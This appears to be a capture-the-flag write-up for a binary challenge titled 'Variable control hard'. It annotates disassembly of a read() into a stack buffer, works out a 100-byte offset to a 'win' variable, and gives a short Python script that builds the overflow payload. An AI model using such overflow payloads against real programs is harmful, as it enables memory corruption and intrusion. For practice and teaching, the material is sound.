#Variable control hard 

`printf` receives:

```text
RDI = format string
RSI = value being printed
```

---

-- Input buffer is here

```asm
lea    -0x80(%rbp),%rax
mov    %rax,%rsi
mov    $0x0,%edi
call   0x401140 <read@plt>
```

```text
RDI = 0 → stdin

RSI = RBP-0x80 → buffer

RDX = 0x1000 → maximum amount to read
```

---

-- WIN variable is here

```asm
mov    -0x1c(%rbp),%eax
cmp    $0x7e9f68f,%eax
```

---

-- Lose variable is here

```asm
mov    -0x18(%rbp),%eax
test   %eax,%eax
je     0x401a26
```

`test eax,eax` checks whether the value is zero.

This is the lose variable.

---

-- Offset

The offset from the input buffer to the WIN variable is 100 bytes + 4-byte value `0x07e9f68f`.

It should be in little-endian, so:

```text
8f f6 e9 07
```

---

-- Script

```python
import sys
import struct

payload = b"A" * 100

payload += struct.pack("<I", 0x07e9f68f)

sys.stdout.buffer.write(payload)
```
